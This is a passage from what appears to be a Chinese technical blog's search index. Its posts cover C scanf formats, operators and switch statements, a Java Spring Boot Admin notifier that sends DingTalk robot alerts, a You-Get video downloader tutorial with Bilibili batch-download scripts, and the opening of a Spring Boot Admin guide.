格式控制字符串的一般形式为：%[*][输入数据宽度][长度] 类型，其中有方括号 [ ] 的项为任选项，各项的意义如下：1234i. *符号：用以表示该输入项读入后不赋予相应的变量，即跳过该输入值，例如: scanf("%d %*d %d", &amp;a, &amp;b)，当输入为：1 2 3 时，将把1赋予a，2被跳过，3赋予bi. 宽度：用十进制整数指定输入的宽度(即字符数)，例如：scanf("%5d", &amp;a)，当输入为：12345678，只把12345赋予变量a，其余部分被截去；又如：scanf("%4d%4d", &amp;a, &amp;b)，当输入为：12345678，将把1234赋予a，而把5678赋予biii. 长度：格式符为l和h，h表示输入短整型数据，l表示输入长整型数据（如%ld） 和双精度浮点数（如%lf）iiii. 类型：表示输入数据的类型，其格式符和意义和printf函数相同，如：d表示输入十进制整数 使用 scanf 函数必须注意以下几点：123456i. 若输入的数据与输出的类型不一致时，虽然编译能够通过，但输出结果可能不正确ii. scanf函数中没有精度控制，如：scanf("%5.2f", &amp;a) 是非法的，不能企图用此语句输入小数为2位的实数iii. scanf中要求给出变量地址，如给出变量名则会出错，如 scanf("%d", a) 是非法的，应改为 scanf("%d", &amp;a) 才是合法的iiii. 在输入多个数值数据时，若格式控制串中没有非格式字符作为输入数据之间的间隔，则可用空格、TAB或回车作间隔；C编译器在碰到空格、TAB、回车或非法数据（如对“%d”输入“12A”，A即为非法数据）时，即认为数据输入结束iiiii. 如果格式控制串中有非格式字符，则输入时也要输入该非格式字符，例如：scanf("%d,%d,%d", &amp;a, &amp;b, &amp;c)，其中用非格式符“,”作间隔符，则输入数据应为：5,6,7，又如：scanf("a=%d,b=%d,c=%d", &amp;a, &amp;b, &amp;c)，则输入数据应为：a=5,b=6,c=7iiiiii. 在输入字符数据时，若格式控制串中无非格式字符，则认为所有输入的字符均为有效字符，如：scanf("%c%c%c", &amp;a, &amp;b, &amp;c)，当输入为：d e f，则把\'d\'赋予a，\' \'赋予b，\'e\'赋予c，只有当输入为：def 时，才能把\'d\'赋于a，\'e\'赋予b，\'f\'赋予c。如果在格式控制中加入空格作为间隔，如：scanf("%c %c %c", &amp;a, &amp;b, &amp;c)，则输入时各数据之间可加空格，a、b、c也将会被赋予正确的值 关系运算符及其优先级关系运算符都是双目运算符，其结合性均为左结合，分别是 &lt;、&lt;=、&gt;、&gt;=、==、!=。关系运算符的优先级低于算术运算符，高于赋值运算符。在六个关系运算符中，前四个 &lt;、&lt;=、&gt;、&gt;= 的优先级相同，且高于 ==、!= 的优先级、而 ==、!= 的优先级相同。 关系表达式 关系表达式的一般形式为：表达式 关系运算符 表达式，例如：a+b &gt; c-d、x &gt; 3/2、-i-5*j == k+1。由于表达式也可以又是关系表达式，因此也允许出现嵌套的情况，例如：a &gt; (b&gt;c)、a != (c==d) 关系表达式的值是” 真” 和 “假”，分别使用 “1” 和 “0” 表示，例如：5 &gt; 0 的值为 “真”，即为 1，又如：(a=3) &gt; (b=5) 由于 3 &gt; 5 不成立，故其值为” 假”，即为 0 逻辑运算符及其优先级 C 语言中提供了三种逻辑运算符：&amp;&amp;（与运算）、||（或运算）、!（非运算），其中与运算符 &amp;&amp; 和或运算符 || 均为双目运算符，具有左结合性。非运算符 ! 为单目运算符，具有右结合性。三种逻辑运算符的优先级是如下图（最高处的运算符级别最高） 逻辑运算的值也分为 “真” 和 “假” 两种，用 “1” 和 “0 ” 来表示。其求值规则如下，与运算符 &amp;&amp;： 参与运算的两个量都为真时，结果才为真，否则为假，例如：5&gt;0 &amp;&amp; 4&gt;2，由于 5&gt;0 为真，4&gt;2 也为真，相与的结果也为真。或运算符 ||： 参与运算的两个量只要有一个为真，结果就为真，两个量都为假时，结果为假，例如：5&gt;0 || 5&gt;8 由于 5&gt;0 为真，相或的结果也就为真。非运算符 !： 参与运算量为真时，结果为假，参与运算量为假时，结果为真，例如：!(5&gt;0) 的结果为假 逻辑表达式 逻辑表达式的一般形式为：表达式 逻辑运算符 表达式，其中的表达式可以又是逻辑表达式，从而组成了嵌套的情形。例如：(a &amp;&amp; b) &amp;&amp; c，根据逻辑运算符的左结合性，也可写为：a &amp;&amp; b &amp;&amp; c if 语句if 语句可以构成分支结构，它根据给定的条件进行判断，以决定执行某个分支程序段，C 语言的 if 语句有三种基本形式： 第一种形式为：if (表达式) 语句，其语义是：如果表达式的值为真，则执行其后的语句，否则不执行该语句 第二种形式为: if-else 第三种形式为：if-else-if，前两种形式的 if 语句一般都用于两个分支以下的情况，当有多个分支选择时，可采用 if-else-if 语句 使用 if 语句应注意的问题 为了避免这种二义性，C 语言规定，else 总是与它前面最近的 if 配对 在 if 语句中，条件判断表达式必须用括号括起来，在语句之后必须加分号 在 if 语句的三种形式中，所有的语句应为单个语句，如果要想在满足条件时执行一组（多个）语句，则必须把这一组语句用 {} 括起来组成一个复合语句，但是在 } 之后不能再加分号 在三种形式的 if 语句中，在 if 关键字之后均为表达式，该表达式通常是逻辑表达式或关系表达式，但也可以是其它表达式，如赋值表达式等，甚至也可以是一个变量。例如：if(a=5) 语句、if(b) 语句 都是合法的，只要表达式的值为非 0，即为 “真” 条件运算符与条件表达式 条件运算符为 ? 和 :，它是一个三目运算符，即有三个参与运算的量。由条件运算符组成条件表达式的一般形式为：表达式 1? 表达式 2: 表达式 3，其求值规则为：如果表达式 1 的值为真，则以表达式 2 的值作为条件表达式的值，否则以表达式 3 的值作为整个条件表达式的值 条件表达式通常用于赋值语句之中，例如条件语句：if(a&gt;b) max=a; else max=b;，可用条件表达式改写为 max=(a&gt;b)?a:b;，执行该语句的语义是：如 a&gt;b 为真，则把 a 赋予 max，否则把 b 赋予 max 条件运算符的运算优先级低于关系运算符和算术运算符，但高于赋值符，因此 max=(a&gt;b)?a:b 可以去掉括号而写为 max=a&gt;b?a:b。条件运算符？和：是一对运算符，不能分开单独使用，其结合方向是自右至左 switch 语句 C 语言还提供了另一种用于多分支选择的 switch 语句，其一般形式为： 1234567switch(表达式){ case 常量表达式: 语句1; case 常量表达式: 语句2; ... case 常量表达式: 语句n; default: 语句n+1;} 其语义是计算表达式的值，并逐个与其后的常量表达式值相比较，当表达式的值与某个常量表达式的值相等时，则执行其后的语句，然后不再进行判断，继续执行后面所有 case、default 后的语句（没有使用 break 关键字的时候） 在使用 switch 语句时还应注意以下几点： 12345i. default子句可以省略不用ii. 在case后的各常量表达式的值不能相同，否则会出现错误iii. 在case后，允许有多个语句，可以不用{}括起来，但建议使用{}括起来iiii. 各case和default子句的先后顺序可以变动，而不会影响程序执行结果 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c语言"},{title:"Spring Boot Admin 集成钉钉群机器人报警通知",url:"/posts/e728f445.html",text:'前言实现流程创建钉钉群机器人后，得到 Webhook 与 Secret。Java 代码 实现 Admin 的 Notifier 接口，当监听到 Admin 服务状态变更后，直接调用 Webhook 发送消息给钉钉群机器人，群成员就可以收到报警消息通知，这个过程与 Github 的 Webhook 实现流程一致。 钉钉官方文档 钉钉官方文档 - 自定义机器人接入 钉钉官方文档 - 自定义机器人接入界面 值得一提的是，本文使用的是钉钉提供的 自定义机器人 接口，而不是 开发企业内部机器人 接口，同时 Webhook 里包含的 access_token 不存在有效期（永久有效），即不需要定时刷新 access_token。 创建钉钉群机器人首先登录钉钉的 PC 版，创建钉钉群机器人，得到钉钉群机器人的 Webhook；在群机器人的安全设置页面，若选择加签名，加签一栏下面还可以获取到 SEC 开头的字符串（签名秘钥）。 Admin 集成钉钉群机器人通知Java 核心代码钉钉群机器人的配置类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import org.springframework.beans.factory.annotation.Value;import org.springframework.context.annotation.Configuration;@Configurationpublic class DingTalkConfig { /** * 是否启用钉钉群机器人通知（默认否） */ @Value("${notify.dingtalk.enable:false}") private boolean robotEnable; /** * 钉钉群机器人所给URL后面的access_token参数值 */ @Value("${notify.dingtalk.access-token:}") private String accessToken; /** * 钉钉群机器人的签名秘钥 */ @Value("${notify.dingtalk.sign-secret:}") private String signSecret; /** * 是否加签名（默认是） */ @Value("${notify.dingtalk.enable-signature:true}") private boolean enableSignature; public boolean isRobotEnable() { return robotEnable; } public String getAccessToken() { return accessToken; } public String getSignSecret() { return signSecret; } public boolean isEnableSignature() { return enableSignature; }} 钉钉群机器人的消息类型枚举类 12345678910111213141516171819202122232425262728293031public enum DingTalkMessageType { TEXT("text", "文本消息"), LINK("link", "链接消息"), MARK_DOWN("markdown", "MarkDown消息"), FEED_CARD("feedCard", "FeedCard消息"), ACTION_CARD("actionCard", "ActionCard消息"); private String value; private String name; DingTalkMessageType(String value, String name) { this.value = value; this.name = name; } public String getValue() { return value; } public String getName() { return name; }} 钉钉群机器人的常量类 123456789public class DingTalkConstants { public static final String SERVER_URL = "https://oapi.dingtalk.com"; public static final String API_SEND_MESSAGE = SERVER_URL + "/robot/send?access_token=%s"; public static final String API_SEND_MESSAGE_SIGN = SERVER_URL + "/robot/send?access_token=%s&amp;timestamp=%s&amp;sign=%s";} 钉钉群机器人的消息发送类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118import cn.hutool.core.codec.Base64;import com.dingtalk.api.DefaultDingTalkClient;import com.dingtalk.api.DingTalkClient;import com.dingtalk.api.request.OapiRobotSendRequest;import com.monitor.notify.config.DingTalkConfig;import com.monitor.notify.constants.DingTalkConstants;import com.monitor.notify.enums.DingTalkMessageType;import com.taobao.api.TaobaoResponse;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.boot.autoconfigure.condition.ConditionalOnExpression;import org.springframework.stereotype.Component;import javax.crypto.Mac;import javax.crypto.spec.SecretKeySpec;import java.net.URLEncoder;/** * 钉钉群机器人消息发送&lt;br&gt; * 每个钉钉群机器人每分钟最多发送20条，如果超过20条，会限流10分钟&lt;br&gt; * 支持多种消息类型，发起POST请求时，必须将字符集编码设置成UTF-8&lt;br&gt; */@Component@ConditionalOnExpression("${notify.dingtalk.enable:false}")public class DingTalkMessageSender { private static final Logger logger = LoggerFactory.getLogger(DingTalkMessageSender.class); private DingTalkConfig dingTalkConfig; public DingTalkMessageSender(DingTalkConfig dingTalkConfig) { this.dingTalkConfig = dingTalkConfig; } /** * 发送文本消息 * * @param msgText 消息内容 * @return */ public boolean sendTextMessage(String msgText) { String logContent = msgText.replace(" ", "").replace("\\n", ""); try { logger.info("钉钉群机器人发送Text消息： {}", logContent); DingTalkClient client = new DefaultDingTalkClient(getUrl()); OapiRobotSendRequest.Text text = new OapiRobotSendRequest.Text(); text.setContent(msgText); OapiRobotSendRequest request = new OapiRobotSendRequest(); request.setMsgtype(DingTalkMessageType.TEXT.getValue()); request.setText(text); TaobaoResponse response = client.execute(request); return response.isSuccess(); } catch (Exception e) { logger.error("钉钉群机器人发送Text消息失败 : {} : {}", logContent, e.getLocalizedMessage()); } return false; } /** * 发送Markdown消息 * * @param title 标题 * @param msgText 消息内容 * @return */ public boolean sendMarkdownMessage(String title, String msgText) { String logContent = msgText.replace(" ", "").replace("\\n", ""); try { logger.info("钉钉群机器人发送Markdown消息： {}", logContent); DingTalkClient client = new DefaultDingTalkClient(getUrl()); OapiRobotSendRequest.Markdown markdown = new OapiRobotSendRequest.Markdown(); markdown.setTitle(title); markdown.setText(msgText); OapiRobotSendRequest request = new OapiRobotSendRequest(); request.setMsgtype(DingTalkMessageType.MARK_DOWN.getValue()); request.setMarkdown(markdown); TaobaoResponse response = client.execute(request); return response.isSuccess(); } catch (Exception e) { logger.error("钉钉群机器人发送Markdown消息失败 : {} : {}", logContent, e.getLocalizedMessage()); } return false; } /** * 获取URL * * @return * @throws Exception */ private String getUrl() throws Exception { String accessToken = dingTalkConfig.getAccessToken(); if (!dingTalkConfig.isEnableSignature()) { return String.format(DingTalkConstants.API_SEND_MESSAGE, accessToken); } else { Long timestamp = System.currentTimeMillis(); String sign = getSign(timestamp, dingTalkConfig.getSignSecret()); return String.format(DingTalkConstants.API_SEND_MESSAGE_SIGN, accessToken, timestamp, sign); } } /** * 获取签名 * * @param timestamp 时间戳 * @param secret 钉钉群机器人的签名秘钥 * @return * @throws Exception */ private String getSign(Long timestamp, String secret) throws Exception { String stringToSign = timestamp + "\\n" + secret; Mac mac = Mac.getInstance("HmacSHA256"); mac.init(new SecretKeySpec(secret.getBytes("UTF-8"), "HmacSHA256")); byte[] signData = mac.doFinal(stringToSign.getBytes("UTF-8")); return URLEncoder.encode(new String(Base64.encode(signData)), "UTF-8"); }} 消息通知模板类 123456789101112131415161718192021public class MessageTemplate { /** * 默认的监控消息模板 */ public static final String MONITOR_TEXT_TEMPLATE = "服务名: %s（%s） \\n服务状态: %s（%s） \\n服务 IP: %s \\n发送时间: %s"; /** * 钉钉群机器人的MarkDown监控消息模板 */ public static final String MONITOR_MARKDOWN_TEMPLATE_DINGTALK = "**服务名称：**\\n\\n" + "%s（%s）\\n\\n" + "**服务状态：**\\n\\n" + "%s（%s）\\n\\n" + "**服务IP：**\\n\\n" + "%s\\n\\n" + "**发送时间：**\\n\\n" + "%s\\n\\n";} 实现 Admin 的 Notifier 接口来添加钉钉群机器人的消息通知，若需要监听服务的所有事件变更，还可以改为继承 AbstractEventNotifier 类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import de.codecentric.boot.admin.server.domain.entities.Instance;import de.codecentric.boot.admin.server.domain.entities.InstanceRepository;import de.codecentric.boot.admin.server.domain.events.InstanceEvent;import de.codecentric.boot.admin.server.domain.events.InstanceStatusChangedEvent;import de.codecentric.boot.admin.server.notify.AbstractStatusChangeNotifier;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import reactor.core.publisher.Mono;public abstract class CustomNotifier extends AbstractStatusChangeNotifier { private Logger logger = LoggerFactory.getLogger(CustomNotifier.class); protected CustomNotifier(InstanceRepository repository) { super(repository); } @Override protected Mono&lt;Void&gt; doNotify(InstanceEvent event, Instance instance) { return Mono.fromRunnable(() -&gt; { if (event instanceof InstanceStatusChangedEvent) { logger.info("Instance {} ({}) is {}", instance.getRegistration().getName(), event.getInstance(), ((InstanceStatusChangedEvent) event).getStatusInfo().getStatus()); String status = ((InstanceStatusChangedEvent) event).getStatusInfo().getStatus(); switch (status) { // 健康检查没通过 case "DOWN": sendMessage(event, instance, "健康检查没通过"); break; // 服务下线 case "OFFLINE": sendMessage(event, instance, "服务下线"); break; // 服务上线 case "UP": sendMessage(event, instance, "服务上线"); break; // 服务未知状态 case "UNKNOWN": sendMessage(event, instance, "服务出现未知状态"); break; default: break; } } else { logger.info("Instance {} ({}) {}", instance.getRegistration().getName(), event.getInstance(), event.getType()); } }); } public abstract void sendMessage(InstanceEvent event, Instance instance, String content);} Admin 的服务状态变更钉钉群机器人通知实现类 12345678910111213141516171819202122232425262728293031323334353637383940414243import cn.hutool.core.date.DatePattern;import cn.hutool.core.date.DateUtil;import com.monitor.notify.message.DingTalkMessageSender;import com.monitor.notify.template.MessageTemplate;import de.codecentric.boot.admin.server.domain.entities.Instance;import de.codecentric.boot.admin.server.domain.entities.InstanceRepository;import de.codecentric.boot.admin.server.domain.events.InstanceEvent;import de.codecentric.boot.admin.server.domain.events.InstanceStatusChangedEvent;import org.springframework.boot.autoconfigure.condition.ConditionalOnExpression;import org.springframework.stereotype.Component;import java.util.Date;@Component@ConditionalOnExpression("${notify.dingtalk.enable:false}")public class DingtalkNotifier extends CustomNotifier { private DingTalkMessageSender messageSender; protected DingtalkNotifier(InstanceRepository repository, DingTalkMessageSender messageSender) { super(repository); this.messageSender = messageSender; } /** * 发送钉钉群机器人消息 * * @param event * @param instance * @param content */ @Override public void sendMessage(InstanceEvent event, Instance instance, String content) { String instanceName = instance.getRegistration().getName(); String instanceId = event.getInstance().toString(); String status = ((InstanceStatusChangedEvent) event).getStatusInfo().getStatus(); String serviceUrl = instance.getRegistration().getServiceUrl(); String dateTime = DateUtil.format(new Date(), DatePattern.NORM_DATETIME_MS_PATTERN); String message = String.format(MessageTemplate.MONITOR_MARKDOWN_TEMPLATE_DINGTALK, instanceName, instanceId, status, content, serviceUrl, dateTime); this.messageSender.sendMarkdownMessage("监控消息", message); }} YML 配置内容123456notify: dingtalk: enable: true access-token: xxxxxxxxxxx sign-secret: SECxxxxxxxxxxx enable-signature: true 钉钉的 Java SDK由于钉钉官方没有将钉钉的 SDK 发布到 Maven 仓库，因此需要在钉钉官网手动下载最新版的 SDK，然后发布到 Maven 私有仓库，或者安装在本地的 Maven 仓库，最后在项目的 pom.xml 配置文件里添加以下依赖。 12345&lt;dependency&gt; &lt;groupId&gt;com.dingtalk&lt;/groupId&gt; &lt;artifactId&gt;dingtalk-api-sdk&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt;&lt;/dependency&gt; 安装钉钉 SDK 到本地 Maven 仓库的命令如下： 1$ mvn install:install-file -Dfile=taobao-sdk-java-auto_1455552377940-20200322.jar -DgroupId=com.dingtalk -DartifactId=dingtalk-api-sdk -Dversion=1.0.0 -Dpackaging=jar 值得一提的是，不同版本的 钉钉 SDK，其 Maven 坐标中的 groupId、artifactId、version 可能会发生变化，此时只需要将上面对应的参数值替换掉即可。 生产环境扩展建议上述给出的是 Spring Boot Admin 集成钉钉群机器人消息通知的 Demo 代码，生产环境下还需要考虑到如下的实际问题： 报警消息重复发送：若 Admin 应用以集群的方式部署，当 A 应用 DOWN 掉后，那么钉钉群成员将会收到多条 A 应用服务状态变更的报警消息 报警消息的持久化：若大量报警消息积压在 Admin 应用里，但还没来得及发送，此时如果 Admin 应用挂掉，那么报警消息将会丢失，建议使用 消息中间件 的持久化特性来解决 报警消息的发送频率：每个钉钉群机器人每分钟最多发送 20 条，如果超过 20 条，会限流 10 分钟；这里建议利用 任务调度线程池 来实现报警消息的调度发送，同时考虑将多条报警消息合并后再发送，以此来解决报警消息发送频率受限制的问题 参考博客 Java 利用钉钉机器人向钉钉群推送消息 Spring Boot Admin 官方集成各类消息通知的源码实现 Spring Boot Admin 2.0.1 集成自定义监控告警 - 钉钉机器人 一个管理异常通知的 Starter，实现了钉钉消息提醒与邮件提醒 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"数据结构与算法之一",url:"/posts/6f42c94c.html",text:'前言 编程四大基础：数据结构与算法、计算机网络、操作系统、设计模式 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"算法与数据结构"},{title:"You-Get 安装使用与介绍",url:"/posts/4d770034.html",text:'前言 You-Get 是一个基于 Python3 的下载工具，可以很轻松地下载到网络上的视频、图片及音乐资源，默认支持 YouTube、哔哩哔哩、优酷、爱奇艺、腾讯视频等视频网站的下载。下面将介绍在 Linux 系统下如何使用 You-Get，此教程适用于 Centos/Debian/Ubuntu 等 Linux 发行版。 依赖说明 以下是必要的依赖，需要提前单独安装，除非是在 Windows 系统下使用预安装包： Python 3.2+ FFmpeg 1.0+ RTMPDump（可选） 通过 PIP 安装 You-Get 的官方版本通过 PyPI 分发，可从 PyPI 镜像中通过 pip 包管理器安装，务必使用 Python3 的 pip。 1$ pip3 install you-get 软件版本升级 1$ pip3 install --upgrade you-get 下载视频 当观赏到感兴趣的视频，可以使用 --info/-i 参数来查看视频的所有可用画质与格式: 123456789101112131415161718192021222324252627282930$ you-get -i \'https://www.youtube.com/watch?v=jNQXAC9IVRw\'site: YouTubetitle: Me at the zoostreams: # Available quality and codecs [ DEFAULT ] _________________________________ - itag: 43 container: webm quality: medium size: 0.5 MiB (564215 bytes) # download-with: you-get --itag=43 [URL] - itag: 18 container: mp4 quality: medium # download-with: you-get --itag=18 [URL] - itag: 5 container: flv quality: small # download-with: you-get --itag=5 [URL] - itag: 36 container: 3gp quality: small # download-with: you-get --itag=36 [URL] - itag: 17 container: 3gp quality: small # download-with: you-get --itag=17 [URL] 标有 DEFAULT 的为默认画质，一般情况下可直接下载，如 YouTube 视频带有字幕，那边字幕将被一同下载，以 SubRip 格式保存： 1234567891011121314$ you-get \'https://www.youtube.com/watch?v=jNQXAC9IVRw\'site: YouTubetitle: Me at the zoostream: - itag: 43 container: webm quality: medium size: 0.5 MiB (564215 bytes) # download-with: you-get --itag=43 [URL]Downloading zoo.webm ...100.0% ( 0.5/0.5 MB) ├████████████████████████████████████████┤[1/1] 7 MB/sSaving Me at the zoo.en.srt ...Done. 注意: 批量下载可以使用参数 --playlist 目前，视频格式选择没有大规模铺开，默认选项为最高画质 ffmpeg 为必要依赖，用于下载流式视频以及合并分块视频 (例如 Youku)，以及 YouTube 的 1080p 或更高分辨率的视频 如果不希望 You-Get 合并视频，可以使用 --no-merge/-n 下载其他内容 直接使用 URL 下载图片，此功能为测试性，远未完成；对于类似 Tumblr 和 Blogger 的大图有效，但是没有办法为所有网站建立通用格式。 12345678$ you-get https://stallman.org/rms.jpgSite: stallman.orgTitle: rmsType: JPEG Image (image/jpeg)Size: 0.06 MiB (66482 Bytes)Downloading rms.jpg ...100.0% ( 0.1/0.1 MB) ├████████████████████████████████████████┤[1/1] 127 kB/s 暂停与恢复下载 可以使用 Ctrl+C 暂停下载，临时的 .download 文件将保存于输出目录。下次使用 You-Get 传入相同参数时，下载将从上次继续开始。如果下载已经完成，临时的 .download 扩展名文件将会被删除，此时 You-Get 将忽略下载。可以用 --force/-f 强行重新下载，会覆盖同名文件或临时文件！ 设置输出路径或文件名 使用 --output-dir/-o 设置路径，--output-filename/-O 设置输出文件名： 1$ you-get -o ~/Videos -O zoo.webm \'https://www.youtube.com/watch?v=jNQXAC9IVRw\' 提示: 此参数可以帮助使用脚本批量下载于指定目录和文件名 如果原视频标题包含有与系统不兼容的字符，此参数十分有效 代理设置 使用 --http-proxy/-x 为 You-Get 设置 HTTP 代理，同时系统代理 (即系统变量 http_proxy) 会自动生效，使用 --no-proxy 则可以强行关闭代理： 1$ you-get -x 127.0.0.1:8087 \'https://www.youtube.com/watch?v=jNQXAC9IVRw\' 提示: 如果经常使用代理 (网络封锁了部分网站)，考虑将 You-Get 和 ProxyChains 一同使用，并在命令行中设置 alias you-get="proxychains -q you-get" 对于某些网站 (例如 Youku)，如果你需要下载仅供中国大陆观看的视频，可以使用 --extractor-proxy/-y 单独为解析器设置代理，也可以使用 -y proxy.uku.im:8888 (鸣谢： Unblock Youku 项目) 播放视频 使用 --player/-p 将视频投喂给播放器，例如 mplayer 或者 vlc，而不是下载视频： 1$ you-get -p vlc \'https://www.youtube.com/watch?v=jNQXAC9IVRw\' 或者想在浏览器中观看而不希望看广告或评论区: 1$ you-get -p chromium \'https://www.youtube.com/watch?v=jNQXAC9IVRw\' 提示：可以使用 -p 开启下载工具，例如 you-get -p uget-gtk \'https://www.youtube.com/watch?v=jNQXAC9IVRw\'，虽然有可能不灵。 加载 Cookie 并非所有视频可供任何人观看，如果需要登录才可以观看 (例如会员视频)，那么可能必须将浏览器的 cookie 通过 --cookies/-c 加载入 You-Get，目前支持两种 cookie 格式：Mozilla cookies.sqlite 和 Netscape cookies.txt。 复用解析数据 使用 --url/-u 获得页面所有可下载 URL 列表，使用 --json 参数则可以获得 JSON 格式的数据，目前此功能未定型，JSON 格式未来有可能变化。 哔哩哔哩批量下载脚本 针对哔哩哔哩的视频，若批量下载参数 --playlist 不适用，可以使用以下 Shell 脚本实现批量下载，传入的参数包括：URL、开始集数、结束集数。如果希望同时执行多个下载任务，那么可以使用不同的参数来多次执行脚本，此操作由于频繁访问哔哩哔哩的视频网站，存在 IP 被封的风险（Http 请求返回 403 错误码）。 12#!/bin/shfor i in $(seq $2 $3); do you-get $1$i; done 或者控制每次执行下载任务之前都等待 N 秒（建议 40 &lt;= N &lt;= 60），防止连续多次下载失败时，频繁访问服务器导致 IP 被封： 12#!/bin/shfor i in $(seq $2 $3); do sleep 40 &amp;&amp; you-get $1$i; done Shell 脚本使用示例： 1sh bilibil.sh https://www.bilibili.com/video/av33087749/?p= 1 3 参考资料 You-Get 官方英文使用说明 You-Get 官方中文使用说明 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"C++ 开发知识图谱 (最新)",url:"/posts/87f5b84d.html",text:'C++ 基础知识 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"知识图谱"},{title:"Spring Boot Admin 基础使用教程",url:"/posts/748546b6.html",text:'1、Admin 简介Spring Boot Admin 是一个开源社区项目，用于管理和监控 Spring Boot 应用程序。 应用程序作为 Spring Boot Admin Client 向为 Spring Boot Admin Server 注册（通过 HTTP 协议）或使用 Spring Cloud 注册中心（例如 Eureka、Consul）的服务发现。UI 是的 AngularJs 应用程序，用于展示 Spring Boot Admin Client 的 Actuator 端点上的一些监控数据。Spring Boot Admin 默认提供了如下功能（包括但不限于）： 显示健康状态及详细信息，如 JVM 和内存指标、数据源指标、缓存指标 显示构建信息编号 跟踪并下载日志文件 查看 JVM 系统和环境属性 查看 Spring Boot 配置属性 轻松的日志级别管理 与 JMX-Beans 交互 查看线程转储 查看 Http 跟踪 查看 auditevents 查看 http-endpoints 查看计划任务 查看和删除活动会话（基于 Spring-Session） 查看 Flyway/Liquibase 数据库迁移 下载 heapdump 文件 状态变更通知（支持电子邮件、Slack、Hipchat …） 状态更改的事件日志（非持久性） 特别注意：Spring Boot Admin 默认不支持监控数据的持久化，若对数据的持久化有要求，建议考虑使用 Metrics、CAT、Prometheus + Grafana 等监控平台。 2、Admin 快速入门2.1、版本说明在本文中，使用的 Spring Cloud 版本是 Hoxton.SR1，对应的 Spring Boot 版本是 2.2.2.RELEASE，特别声明除外，点击下载完整的案例代码。 2.2、创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 123456789101112131415161718192021222324252627282930&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.2.2.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Hoxton.SR1&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 2.3、创建 Admin Server 工程创建 Admin Server 的 Maven 工程，配置工程里的 pom.xml 文件： 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;de.codecentric&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-admin-starter-server&lt;/artifactId&gt; 